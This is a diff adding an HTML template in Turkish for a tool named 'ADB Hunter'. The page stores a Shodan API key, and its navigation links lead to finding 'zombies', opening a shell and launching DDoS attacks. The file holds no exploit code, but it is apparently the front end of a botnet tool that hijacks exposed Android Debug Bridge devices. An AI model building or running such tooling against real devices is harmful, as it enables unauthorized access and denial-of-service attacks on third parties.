@@ -1,0 +1,164 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <link rel="icon" type="image/svg" href="{{url_for('static', filename='images/logo.svg')}}">
+    <title>ADB Hunter</title>
+
+    <script src="{{url_for('static', filename='jquery.js')}}"></script>
+    <script src="{{url_for('static', filename='popper.min.js')}}"></script>
+    <script src="{{url_for('static', filename='bootstrap.min.js')}}"></script>
+    <link rel="stylesheet" href="{{url_for('static', filename='bootstrap.min.css')}}">
+    <link rel="stylesheet" href="{{url_for('static', filename='style.css')}}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script>
+        function show_error() {
+            var x = document.getElementById("error_box");
+            x.style.display = "none";
+
+            var y = document.getElementById("success_box");
+            y.style.display = "none"
+
+            var z = document.getElementById("error_box_blank");
+            z.style.display = "none"
+
+            x.style.display = "block";
+        }
+
+        function show_success() {
+            var x = document.getElementById("error_box");
+            x.style.display = "none";
+
+            var y = document.getElementById("success_box");
+            y.style.display = "none"
+
+            var z = document.getElementById("error_box_blank");
+            z.style.display = "none"
+
+            y.style.display = "block";
+        }
+
+        function show_blank_error() {
+            var x = document.getElementById("error_box");
+            x.style.display = "none";
+
+            var y = document.getElementById("success_box");
+            y.style.display = "none"
+
+            var z = document.getElementById("error_box_blank");
+            z.style.display = "none"
+
+            z.style.display = "block";
+        }
+
+        function update() {
+            var api_key = document.getElementById("api_key_input");
+            if (api_key.value.trim() == "") {
+                show_blank_error()
+                return;
+            }
+
+            if (api_key.value.trim().length != 32) {
+                show_blank_error()
+                return;
+            }
+
+            var xmlhttp = new XMLHttpRequest(); // new HttpRequest instance 
+            try {
+                xmlhttp.open("POST", "/update/", false);
+                xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+                xmlhttp.send(JSON.stringify({
+                    "api-key": api_key.value.trim()
+                }));
+                if (xmlhttp.responseText == "OK") {
+                    show_success()
+                };
+            } catch (ex) {
+                show_error()
+                console.log(ex)
+            }
+        }
+    </script>
+
+</head>
+
+<body>
+    <!-----Navbar------>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+        <a class="navbar-brand" href="/"><img class="logo" src="{{url_for('static', filename='images/logo.svg')}}"></a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#nav_bar" aria-controls="nav_bar" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="nav_bar">
+            <ul class="navbar-nav mr-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>&nbsp;&nbsp;Anasayfa</a>
+                </li>
+                <li class="nav-item active">
+                    <a class="nav-link" href="/shodan"><i class="fa fa-sliders" aria-hidden="true"></i>&nbsp;&nbsp;Shodan Ayarları<span class="sr-only">(current)</span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/zombies"><i class="fa fa-users" aria-hidden="true"></i>&nbsp;&nbsp;Zombileri Bul</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/shell"><i class="fa fa-terminal" aria-hidden="true"></i>&nbsp;&nbsp;Shell Aç</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/ddos"><i class="fa fa-bullseye" aria-hidden="true"></i>&nbsp;&nbsp;Saldır</a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container" id="error_box" style="width: 100%; margin-top: 3%; display:none">
+        <div class="card border-secondary mb-3">
+            <div class="card-header card-header-danger">Hata Gerçekleşti!</div>
+            <div class="card-body">
+                <h4 class="card-title">Güncelleme yapılırken hata gerçekleşti!</h4>
+                <p class="card-text">Hata mesajını görüntülemek için konsolu ve python konsolunu kontrol edin.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" id="error_box_blank" style="width: 100%; margin-top: 3%; display:none">
+        <div class="card border-secondary mb-3">
+            <div class="card-header card-header-danger">Hata Gerçekleşti!</div>
+            <div class="card-body">
+                <h4 class="card-title">Güncelleme yapılırken hata gerçekleşti!</h4>
+                <p class="card-text">Doğru bir anahtar girilmedi! Kutucukları kontrol edin.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" id="success_box" style="width: 100%; margin-top: 3%; display:none">
+        <div class="card border-secondary mb-3">
+            <div class="card-header card-header-success">Başarılı!</div>
+            <div class="card-body">
+                <h4 class="card-title">Bilgileriniz güncellendi!</h4>
+                <p class="card-text">Artık Shodan'da arama yapabilirsiniz.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" style="width: 100%; margin-top: 3%">
+        <div class="card border-secondary mb-2">
+            <div class="card-header card-header-primary">Shodan API Anahtarı</div>
+            <div class="card-body">
+                <h4 class="card-title">Arama yapmak için Shodan API anahtarına ihtiyacımız var.</h4>
+                <p class="card-text">Shodana giriş yaptıkdan sonra anahtarınızı https://account.shodan.io/ adresinden bulabilirsiniz.</p>
+                <div class="form-group">
+                    <label class="control-label">Shodan API Anahtarı</label>
+                    <div class="form-group">
+                        <input type="text" class="form-control" id="api_key_input" aria-label="API Anahtarı" placeholder="{{api_key}}" style="margin-bottom:2%">
+                        <button type="button" class="btn btn-primary btn-lg btn-block" onclick="update()">Güncelle!</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body>
+
+</html>
